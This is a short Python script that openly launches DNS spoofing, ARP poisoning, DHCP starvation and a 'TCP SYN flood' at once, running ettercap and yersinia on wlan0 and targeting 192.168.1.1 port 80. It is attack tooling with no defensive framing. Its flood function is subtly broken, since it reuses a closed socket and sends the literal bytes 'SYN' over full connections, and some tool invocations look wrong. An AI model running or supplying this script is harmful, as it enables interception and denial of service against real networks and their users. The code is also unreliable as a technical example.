import os
import socket
import threading
import time

# Function to perform a DNS spoofing attack
def dns_spoofing_attack():
    print("Starting DNS Spoofing Attack...")
    os.system("ettercap -T -q -i wlan0 -P dns_spoof")

# Function to perform an ARP poisoning attack
def arp_poisoning_attack():
    print("Starting ARP Poisoning Attack...")
    os.system("ettercap -T -q -i wlan0 -P arp_poison")

# Function to perform a DHCP starvation attack
def dhcp_starvation_attack():
    print("Starting DHCP Starvation Attack...")
    os.system("yersinia -I wlan0 -d")

# Function to perform a TCP SYN flood attack
def tcp_syn_flood_attack(target_ip, target_port):
    print("Starting TCP SYN Flood Attack...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        sock.connect((target_ip, target_port))
        sock.send(b"SYN")
        sock.close()

# Main program
if __name__ == '__main__':
    # Start the attacks
    threading.Thread(target=dns_spoofing_attack).start()
    threading.Thread(target=arp_poisoning_attack).start()
    threading.Thread(target=dhcp_starvation_attack).start()
    threading.Thread(target=tcp_syn_flood_attack, args=("192.168.1.1", 80)).start()

    print("Attacks started!")
    while True:
        time.sleep(1)